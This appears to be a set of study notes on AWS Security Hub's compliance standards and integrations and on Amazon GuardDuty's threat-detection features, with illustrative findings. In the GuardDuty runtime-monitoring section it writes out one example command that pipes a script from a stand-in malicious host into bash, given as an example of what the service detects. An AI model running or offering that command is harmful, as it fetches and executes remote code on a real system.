# AWS Security Hub
AWS **Security Hub** is a **cloud security posture management (CSPM)** service that **centralizes and automates security checks** across your AWS environment. It aggregates findings from AWS services and supported third-party tools, evaluates compliance against multiple standards, and helps you **identify, prioritize, and respond to security risks**.

> The Security Hub provides a single place in the AWS environment to aggregate, organize, and prioritize security alerts and discoveries from multiple AWS security services. This may be Amazon GuardDuty, Amazon Inspector, Amazon Macie, IAM, Access Analyzer, AWS Firewall Manager. But it also supports third-party partner products.

![image](https://github.com/user-attachments/assets/93e97d18-4cd9-4547-83a7-9e271cd004ce)

---

### [Key Concepts - Refer the Documentation For Now](https://docs.aws.amazon.com/securityhub/latest/userguide/securityhub-concepts.html) 
- Detailed explain on the way to be prepared.

---

## What Are Security Standards in Security Hub?

Security standards in AWS Security Hub are **automated compliance frameworks** that consist of **security controls** (automated checks) designed to enforce **best practices** in cloud security. Each **enabled standard** will:

* Continuously **evaluate your AWS account and resources**,
* Generate **control findings** if a check fails,
* Help you assess and maintain **security compliance**,
* Provide **security scores** to measure posture across accounts.

---

## Overview of Current Supported Security Standards (As of 2025)

| Security Standard                                   | Type       | Managed/Defined By                 | Purpose                                                                                               | Coverage                           | Compliance Scope                       | Ideal For                                 |
| --------------------------------------------------- | ---------- | ---------------------------------- | ----------------------------------------------------------------------------------------------------- | ---------------------------------- | -------------------------------------- | ----------------------------------------- |
| **AWS Foundational Security Best Practices (FSBP)** | AWS native | AWS Security Experts               | Secure core AWS services and accounts                                                                 | 50+ AWS services                   | AWS-native security hardening          | All AWS users                             |
| **CIS AWS Foundations Benchmark**                   | External   | Center for Internet Security (CIS) | Enforce cloud infrastructure hygiene and secure configurations                                        | Basic AWS setup                    | General best practices                 | Audit-readiness                           |
| **PCI DSS v3.2.1**                                  | Compliance | PCI Security Standards Council     | Secure credit card data for companies accepting, processing, storing, or transmitting cardholder data | Payment-related services           | Required for credit card data handling | E-commerce, fintech                       |
| **NIST SP 800-53 Rev 5**                            | Government | NIST (U.S. Gov)                    | Framework for securing information systems used by U.S. federal agencies                              | Broad controls for federal systems | U.S. federal standards                 | Gov contractors, compliance-heavy sectors |
| **NIST Cybersecurity Framework (CSF)**              | Government | NIST                               | Risk-based framework for organizations to manage and reduce cybersecurity risk                        | Framework-driven                   | Customizable                           | Organizations building custom programs    |



<details>
 <summary>1. AWS Foundational Security Best Practices (FSBP)</summary>

## 1. AWS Foundational Security Best Practices (FSBP)

### Description and Purpose:
- FSBP is a compilation of security best practices developed by AWS and industry professionals, suitable for organizations of all sectors and sizes.
- It aims to detect when your AWS accounts and deployed resources deviate from security best practices, offering prescriptive guidance to improve and maintain your security posture.
- This standard covers AWS’s most popular and foundational services, ensuring a broad scope of security checks.
- The **AWS Foundational Security Best Practices** standard is a curated set of **automated checks** that enforce **AWS-recommended configurations** for key AWS services like:
  - S3, IAM, EC2, RDS, Lambda, CloudTrail, etc.

### Why It Is Used:
* To ensure your **AWS configurations follow security best practices** as defined by AWS security engineers. FSBP is essential for establishing a strong security foundation in AWS. It helps prevent common **misconfigurations and vulnerabilities**
* Helps teams **reduce the attack surface** in day-to-day deployments. By following FSBP, you can align your environment with AWS-recommended practices, reducing the risk of security breaches.

### What It Checks:
- FSBP includes a wide range of controls, each checking a specific aspect of your AWS setup. Here are some examples:
  - _**Account.1:**_ Ensures security contact information is provided for an AWS account, so AWS can notify you in case of security issues.
  - _**ACM.1:**_ Checks if imported and ACM-issued certificates are renewed after a specified time period, ensuring secure communication.
  - **_APIGateway.1:_** Verifies that API Gateway REST and WebSocket API execution logging is enabled, important for monitoring and auditing.
  - **_AutoScaling.2:_** Ensures Auto Scaling groups are spread across multiple Availability Zones, improving reliability and security.
  - **_CloudFront.1:_** Checks if CloudFront distributions have a default root object configured, preventing misconfigurations.
  - **_RDS.1:_** Ensures Amazon RDS databases are encrypted at rest, protecting data even when not in use. RDS instances without backups.

### Where It Is Used:

* All production, staging, and dev environments in AWS
* Used by **organizations of any size** looking to harden their AWS deployments

### How It Works in Security Hub:
- When enabled, FSBP runs continuous and automated account and resource-level configuration checks. It generates findings if any control fails, helping you identify and remediate issues promptly.
- The security score for FSBP reflects your overall compliance, making it easy to track improvements over time.

</details>



<details>
 <summary>2. CIS AWS Foundations Benchmark</summary>

## 2. CIS AWS Foundations Benchmark

### Description and Purpose:
The **Center for Internet Security (CIS)** Benchmark is an **independent** security framework specifically tailored to **AWS infrastructure**. Security Hub supports the **Level 1 controls** from this benchmark.
- This standard automatically checks for your compliance readiness against a subset of CIS requirements, ensuring your environment meets widely accepted security practices.

### Why It Is Used:
* To validate your AWS configuration aligns with **independent industry-standard benchmarks**, CIS benchmarks are often required for compliance with industry regulations and standards, making this standard crucial for organizations needing to demonstrate security alignment.
* Frequently used by organizations preparing for **audits or external certifications**, It’s particularly useful for businesses in regulated industries, helping them meet external compliance requirements.

### What It Checks:
- The CIS Benchmark includes controls that focus on key security areas. Examples include:
  - **_Avoid the use of the "root" account:_** Ensures you don’t use the root account for daily tasks, as it has full access and poses a high risk if compromised.
  - **_Ensure credentials unused for 90 days or more are disabled:_** Prevents old, unused accounts from being exploited, enhancing security.
  - **_Ensure IAM password policy requires a minimum length of 14 or greater:_** Enforces strong passwords, making them harder to guess or crack.
  - **_Ensure MFA is enabled for the "root" account:_** Adds an extra layer of security by requiring a second authentication factor.
  - **_Ensure no security groups allow ingress from 0.0.0.0/0 to port 22_**: Prevents public access to SSH, reducing the risk of unauthorized access to EC2 instances.
  - **_Ensure rotation for customer-created KMS keys is enabled:_** Ensures encryption keys are rotated regularly, improving security for encrypted data.

### Where It Is Used:

* Organizations undergoing **internal or third-party security audits**
* Companies following **compliance-driven development** models

### How It Works in Security Hub:
- When enabled, Security Hub runs automated checks against these CIS controls, generating findings for any non-compliance. You can review these findings in the Security Hub console, filter by severity, and take corrective actions.
- The security score for this standard helps you track your compliance with CIS guidelines, making it easier to prioritize remediation efforts.

</details>



<details>
 <summary>3. PCI DSS v3.2.1</summary>

## 3. PCI DSS v3.2.1

### Description and Purpose:
The **Payment Card Industry Data Security Standard (PCI DSS)** is a global compliance standard for **handling credit card data**. Security Hub maps AWS checks to portions of this standard.
- PCI DSS is a set of security standards specifically designed for businesses that handle credit card information, including accepting, processing, storing, or transmitting credit card data.
- This standard ensures compliance with requirements to protect cardholders’ data, crucial for avoiding fines, legal issues, and loss of customer trust.

### Why It Is Used:
* To maintain **PCI compliance** for organizations dealing with cardholder data, For organizations processing credit card payments, PCI DSS compliance is mandatory. Non-compliance can lead to significant penalties and reputational damage.
* To ensure customer financial information is **protected and secured**, Security Hub’s automated checks help simplify compliance.

### What It Checks:
- While the exact controls aren’t detailed in the provided information, PCI DSS generally includes checks such as:
  - Ensuring credit card data is encrypted when stored, protecting it from unauthorized access.
  - Verifying that systems transmitting credit card data use secure protocols, like HTTPS, to prevent data interception.
  - Checking that access to credit card data is restricted to authorized personnel only, reducing the risk of internal breaches.
  - Regularly testing security systems and processes to ensure they’re effective and up to date.
* Encrypted storage of sensitive data
* Segmentation of public/private networks
* IAM access controls for cardholder data
* Logging and monitoring of data access
* Secure transmission (TLS)
* Key management and rotation policies

### Where It Is Used:
* **E-commerce platforms**
* SaaS providers that handle **online payments**
* Fintech or POS solution vendors

### How It Works in Security Hub:
- Enabling PCI DSS in Security Hub runs automated checks against these requirements, generating findings for any non-compliance. For example, if a database storing credit card information isn’t encrypted, Security Hub will alert you to encrypt it.
- The security score for PCI DSS helps you monitor your compliance status, ensuring you meet the standards needed for credit card processing.

</details>



<details>
 <summary>4. NIST SP 800-53 Rev 5</summary>
 
## 4️⃣ NIST SP 800-53 Rev 5

### 📖 What It Is:

The **National Institute of Standards and Technology (NIST) SP 800-53** is a catalog of **security and privacy controls** used by U.S. federal agencies and contractors.

### 🧠 Why It Is Used:

* To align your cloud workloads with **U.S. government cybersecurity guidelines**
* Mandatory for **federal cloud deployments** (FedRAMP, FISMA compliance)

### 🧪 What It Checks:

* Security control baselines (low, moderate, high impact)
* Resource tagging for tracking and auditing
* Audit logging and access controls
* Contingency planning
* Encryption at rest and in transit
* Incident response mechanisms

### 📍 Where It Is Used:

* Government contractors
* Federal cloud systems
* Heavily regulated industries (e.g., healthcare, defense)

</details>



<details>
 <summary>5. NIST Cybersecurity Framework (CSF)</summary>

## 5️⃣ NIST Cybersecurity Framework (CSF)

### 📖 What It Is:

The **NIST CSF** is a voluntary framework made up of **standards, guidelines, and best practices** to manage and reduce cybersecurity risk.

### 🧠 Why It Is Used:

* Helps organizations build and improve **cybersecurity programs**
* Aligns with business drivers and compliance mandates

### 📁 Framework Functions:

1. **Identify** – Asset and risk management
2. **Protect** – Access control and data security
3. **Detect** – Anomalies and events
4. **Respond** – Incident response
5. **Recover** – Recovery planning

### 📍 Where It Is Used:

* Private sector companies aiming to **modernize security**
* Industries such as banking, healthcare, utilities
* Organizations mapping to **ISO 27001**, **SOC 2**, or **COBIT**

</details>

---

## 🧠 Bonus: How Security Hub Uses These Standards

* You can **enable one or more standards per account or per Region**.
* Security Hub **evaluates controls automatically** on a scheduled basis (usually every 12–24 hours).
* The **security score** reflects how compliant your account is with the standard.
* Failed checks become **findings**, which:

  * Contribute to your **security score**.
  * Can be remediated manually or automatically.
  * Can be exported to **SIEM, ticketing**, or **remediation pipelines**.

---

## 🛠 How AWS Security Hub Works

### ✅ 1. **Security Checks**

* When you **enable a security standard**, Security Hub runs **automated checks (controls)** against your AWS resources.
* Controls evaluate configurations such as S3 bucket permissions, IAM policy strengths, EC2 public access, and more.
* Each check results in a pass or fail.
* **Failed checks generate findings**, which are security issues needing attention.

### 📥 2. **Findings Collection**

* Security Hub **receives findings** from:

  * **Its own controls** (e.g., misconfigured resources)
  * **Other AWS services** like:

    * Amazon GuardDuty (threat detection)
    * Amazon Inspector (vulnerability scans)
    * Amazon Macie (sensitive data protection)
  * **Third-party tools** (firewalls, EDR, SIEM, etc.)

### 📤 3. **Findings Forwarding**

* You can **send findings** from Security Hub to:

  * **Amazon EventBridge** for automated responses
  * **Amazon Detective** for deep investigation
  * **AWS Security Lake** or **SIEM tools** for correlation and storage
  * **AWS Chatbot** for Slack or Teams notifications

### 🤖 4. **Automation**

* **Automation Rules** allow you to:

  * Auto-update finding status (e.g., mark as resolved)
  * Auto-suppress known false positives
  * Trigger notifications or scripts
* **Amazon EventBridge Integration**:

  * Event-driven automation can trigger:

    * AWS Lambda functions
    * SSM OpsItems
    * Incident management workflows

---

## 🔄 Integrated AWS Services

Security Hub integrates with many AWS services, either by **receiving** or **forwarding** findings.

| AWS Service              | What It Does                                 | What Security Hub Does                             |
| ------------------------ | -------------------------------------------- | -------------------------------------------------- |
| **Amazon GuardDuty**     | Detects suspicious activity                  | Receives all threat findings                       |
| **Amazon Inspector**     | Scans EC2 and container images for CVEs      | Receives vulnerability findings                    |
| **Amazon Macie**         | Detects sensitive data and policy violations | Receives data protection findings                  |
| **IAM Access Analyzer**  | Identifies overly permissive policies        | Receives policy findings                           |
| **AWS Config**           | Evaluates resource configurations            | Sends Config rule results                          |
| **SSM Patch Manager**    | Tracks patch compliance for EC2              | Sends compliance violations                        |
| **AWS Firewall Manager** | Manages WAF and Shield policies              | Sends misconfiguration or attack alerts            |
| **Amazon Detective**     | Investigates suspicious activities           | Receives Security Hub findings for deeper analysis |
| **AWS Security Lake**    | Centralized security data lake               | Receives all normalized findings in OCSF format    |
| **AWS Chatbot**          | Slack/Microsoft Teams notifications          | Receives findings for real-time alerts             |
| **AWS Trusted Advisor**  | Best-practices guidance                      | Receives Security Hub results for centralized view |
| **AWS Audit Manager**    | Creates audit-ready reports                  | Receives relevant compliance findings              |
| **Amazon EventBridge**   | Event-based automation                       | Receives and triggers actions from findings        |

---

## 📈 Benefits of Using Security Hub

✅ **Unified View**: View all your AWS security alerts in a single dashboard.

✅ **Automated Best-Practice Checks**: Continuously scan your environment for misconfigurations or compliance issues.

✅ **Integrations with Other Tools**: Pull data from AWS services and third-party tools, and send it to investigative tools or automation pipelines.

✅ **Simplified Compliance**: Helps track and demonstrate compliance with security frameworks.

✅ **Automation Support**: Use EventBridge and Automation Rules to respond in real time to critical findings.

---

## 🧪 How to Use Security Hub

### Step 1: Enable Security Hub

* From the AWS Console, CLI, or CloudFormation
* Can be enabled in multiple regions and across accounts via AWS Organizations

### Step 2: Choose Security Standards

* Select standards like **FSBP**, **CIS**, **PCI DSS**, or **NIST CSF**
* Security Hub will begin running **controls** and evaluating your environment

### Step 3: Review Findings

* Go to the **Findings** tab
* Filter by service, severity, resource type, or compliance standard

### Step 4: Automate Remediation (Optional)

* Use **Automation Rules** or **EventBridge Rules**
* Example: If an S3 bucket is public, auto-remediate using Lambda

    ```mermaid
     graph LR
     A[Data Sources] --> B(Security Hub)
     B --> C[Analysis]
     C --> D[Automated Actions]
     ```  

---

## 🗃️ Data Handling Notes

* **Findings Format**: Security Hub uses a consistent JSON format called **ASFF (AWS Security Finding Format)**.
* **Data Retention**: Findings are retained for **90 days** (unless exported).
* **Multi-Region Support**: You can configure cross-region aggregation for a global view.

---
---

# **Amazon GuardDuty – Threat Detection for AWS**
## Overview
Amazon GuardDuty is a **managed threat detection service** that helps protect your AWS accounts, workloads, and data. It provides **intelligent security monitoring** using **machine learning**, **anomaly detection**, and **threat intelligence**—with **minimal setup** and **no infrastructure to manage**.

---

## 🚀 Key Highlights

### ✅ **Easy to Use**

* **One-click activation** — No need for complex setup or agents.
* **Out-of-the-box functionality** — Immediate insights without extra configurations.

### 🔍 **How It Works**

GuardDuty continuously analyzes **tens of billions of events per minute** from AWS data sources to:

* Detect **suspicious behavior** or unauthorized activities.
* Identify and **prioritize threats** based on context and risk.
* Provide **security context** for faster incident response.

### 🔗 **Integrated and Scalable**

* Works across **EC2**, **ECS**, **EKS**, **AWS Lambda**, **RDS**, **Aurora**, and **S3**.
* Seamless integration with **AWS services** like AWS Security Hub, Amazon EventBridge, and AWS Lambda for **automated remediation**.
* Scales effortlessly across all your AWS resources.

---

## 🧠 Technologies Behind GuardDuty

* **Machine Learning (ML)** to identify anomalies.
* **Threat Intelligence Feeds** from AWS and partners (e.g., malicious IPs/domains, malware hashes).
* **Contextual Analysis** for understanding threats in real time.

---

## ⚠️ What GuardDuty Can Detect

| 🧨 Threat Type                          | 🔍 Description                                                                      |
| --------------------------------------- | ----------------------------------------------------------------------------------- |
| **Compromised Credentials**             | Detects if AWS access keys are stolen and misused.                                  |
| **Data Exfiltration**                   | Flags data theft or destruction—potential signs of ransomware.                      |
| **Unusual DB Access**                   | Anomalous login patterns in Aurora & RDS databases.                                 |
| **Unauthorized Cryptomining**           | Identifies mining operations on EC2 & container instances.                          |
| **Malware Presence**                    | Detects known malware in EC2, containers, and S3 file uploads.                      |
| **Suspicious OS/Network/File Behavior** | Identifies OS-level intrusions on EKS, ECS (Fargate), EC2, and container workloads. |

---

## ✅ Benefits

* **Continuous monitoring** across AWS accounts and regions.
* **No agent required** – Fully managed.
* **Fast threat response** with automated alerts and integrations.
* **Improves security posture** with proactive threat detection.

---

Here is a **detailed and simplified documentation of Amazon GuardDuty features**, including easy-to-understand technical examples for each key capability:

---

# 🛡️ **Amazon GuardDuty – Features with Examples**

Amazon GuardDuty is a smart threat detection service designed to monitor and protect your AWS environment. It uses machine learning, threat intelligence, and behavior analysis to identify security threats in real time.

---

## 🔁 1. **Continuous Monitoring of Foundational Data Sources**

### ✅ Feature:

GuardDuty automatically monitors three main AWS data sources:

1. **AWS CloudTrail management events** – Tracks user activities like API calls.
2. **VPC Flow Logs** – Logs traffic going in and out of your EC2 instances.
3. **DNS Logs** – Tracks domain name lookups made by your resources.

### 🔍 Example:

Suppose an EC2 instance starts making DNS queries to a known malware domain (e.g., `bad-malware-site.ru`). GuardDuty detects this through DNS logs and alerts you with a finding like:

> *"EC2 instance is communicating with a known command-and-control domain."*

📘 No manual setup is required—just enable GuardDuty and it starts monitoring.

---

## 🧠 2. **Extended Threat Detection (Multi-Stage Attacks)**

### ✅ Feature:

Detects **attack chains** that span multiple logs, AWS services, or over time. It correlates events that might seem harmless individually but are dangerous when combined.

### 🔍 Example:

1. An attacker logs into your account using a compromised credential (CloudTrail log).
2. Then launches a new EC2 instance (CloudTrail).
3. That EC2 instance starts scanning internal IPs (VPC Flow Logs).

GuardDuty pieces these events together and creates a single **attack sequence finding**, like:

> *"Suspicious EC2 activity: Unauthorized access followed by lateral network scanning."*

📘 Extended Threat Detection is **enabled by default** and has **no extra cost**.

---

## 🧩 3. **Use-Case Focused Protection Plans**

GuardDuty offers optional "add-on" features for **specific AWS services** to enhance security.

---

### 🔐 **S3 Protection**

Analyzes access patterns and newly uploaded files in your Amazon S3 buckets.

#### 🔍 Example:

If someone downloads hundreds of files in a short time from an S3 bucket, GuardDuty might flag:

> *"Unusual data download from S3 bucket, possible exfiltration."*

📘 Enable S3 protection to monitor **data access and potential leaks**.

---

### ☁️ **EKS Protection**

Monitors Kubernetes API (audit logs) in Amazon EKS for suspicious behavior.

#### 🔍 Example:

A user tries to escalate privileges using `kubectl create clusterrolebinding`:

> *"Kubernetes privilege escalation attempt in EKS cluster."*

📘 Helps detect attacks like misconfigured roles or unauthorized deployments.

---

### 🧩 **Runtime Monitoring**

Watches system-level activity (like file or process operations) in EC2, ECS (Fargate), and EKS.

#### 🔍 Example:

GuardDuty sees a suspicious shell command like:

```bash
curl http://malicious.com/backdoor.sh | bash
```

> *"Suspicious command execution detected in EC2."*

📘 Useful for detecting malware, reverse shells, or script-based attacks.

---

### 🦠 **Malware Protection for EC2 (EBS Scanning)**

Scans EBS volumes for known malware signatures.

#### 🔍 Example:

After a breach, you run a malware scan on EC2 and GuardDuty detects:

> *"Malware signature matched in EBS volume attached to EC2 instance."*

📘 Available as **on-demand or scheduled** scans.

---

### 🧪 **Malware Protection for S3**

Scans newly uploaded S3 objects for malware.

#### 🔍 Example:

Someone uploads an infected ZIP file to an S3 bucket:

> *"Malware detected in newly uploaded file to S3."*

📘 You can use this feature **independently** without enabling full GuardDuty.

---

### 🗄️ **RDS Protection**

Analyzes **login attempts** to Aurora and RDS databases for unusual behavior.

#### 🔍 Example:

Multiple failed login attempts from an IP in another country:

> *"Brute-force login attempt on RDS instance."*

📘 Protects your database from unauthorized access.

---

### ⚡ **Lambda Protection**

Monitors **network activity** of Lambda functions, especially when running in VPC.

#### 🔍 Example:

A Lambda function connects to a known crypto mining domain:

> *"AWS Lambda making outbound calls to known mining pool IP."*

📘 Helps detect misuse of serverless compute for malicious purposes.

---

## 👥 4. **Multi-Account Management**

### ✅ Feature:

Centralized monitoring of multiple AWS accounts using:

* **AWS Organizations** (recommended)
* **Legacy invitation-based method**

### 🔍 Example:

You are a security admin for 10 AWS accounts. Set up GuardDuty in your org master account to monitor all others from one place.

📘 Centralized view = simplified management and cost tracking.

---

## 🧾 5. **Security Findings and Sample Tests**

### ✅ Feature:

GuardDuty generates **detailed findings** when it detects a threat. Each finding includes:

* Threat type and severity
* Affected resources
* Recommended action

### 🔍 Example:

> *"Recon\:EC2/PortProbeUnprotectedPort – An external IP is probing your EC2 port 22 (SSH).”*

You can also:

* Use **sample findings** for testing.
* Use **tester scripts** to simulate scenarios.

📘 Helps teams learn how to respond to real-world alerts.

---

## 📊 6. **Managing and Visualizing Findings**

* View results in the **GuardDuty console dashboard**
* Query findings using:

  * **AWS CLI**
  * **AWS SDK**
  * **AWS Security Hub**

### 🔍 Example:

Security team pulls high-severity findings across accounts:

```bash
aws guardduty list-findings --severity-criteria "HIGH"
```

📘 Enables analysis, alerting, and custom dashboards (e.g., using CloudWatch or Grafana).

---

## 🔗 7. **Integration with AWS Security Services**

### ✅ Integrated Services:

| Service                | Benefit                                                |
| ---------------------- | ------------------------------------------------------ |
| **AWS Security Hub**   | Central view of findings across AWS security services  |
| **Amazon Detective**   | Root cause analysis with visual timeline and graphs    |
| **Amazon EventBridge** | Automated response via Lambda, SNS, or Systems Manager |

### 🔍 Example:

* When GuardDuty finds malware on EC2:

  * Security Hub prioritizes it.
  * Detective shows related actions (login, IP address).
  * EventBridge triggers Lambda to isolate the instance.

📘 Example Rule:

```json
{
  "source": ["aws.guardduty"],
  "detail-type": ["GuardDuty Finding"]
}
```

---

## ✅ 8. **PCI DSS Compliance**

* GuardDuty is **Level 1 PCI DSS certified**.
* Safe to use in environments where **credit card data** is processed or stored.

📘 You can request the AWS PCI Compliance package from the AWS Artifact console.

---

## 🧪 9. **Testing and Validation**

* Generate **sample findings** in the console.
* Use **testing scripts** to simulate threats and test responses.

### 🔍 Example:

Generate test finding:

```bash
aws guardduty create-sample-findings --detector-id <your-detector-id>
```

---

## 💰 Pricing & Trial

* **Pay-as-you-go** – No upfront costs or commitments.
* **30-day free trial** – Try GuardDuty risk-free.

---

## 📝 Final Notes:

* 🧠 **Intelligent & Contextual:** Uses ML + threat feeds
* 🔐 **Broad Coverage:** From EC2 to Lambda, S3 to EKS
* ⚙️ **Automation Friendly:** With EventBridge and Security Hub

---

## 📌 Getting Started

1. Go to the **Amazon GuardDuty console**.
2. Click **"Enable GuardDuty"** for your account.
3. (Optional) Integrate with AWS Organizations to monitor multiple accounts.

## 🔗 Useful Links

* [Amazon GuardDuty Official Documentation](https://docs.aws.amazon.com/guardduty/latest/ug/what-is-guardduty.html)
* [Getting Started with GuardDuty](https://docs.aws.amazon.com/guardduty/latest/ug/guardduty-getting-started.html)
* [GuardDuty Pricing](https://aws.amazon.com/guardduty/pricing/)

---
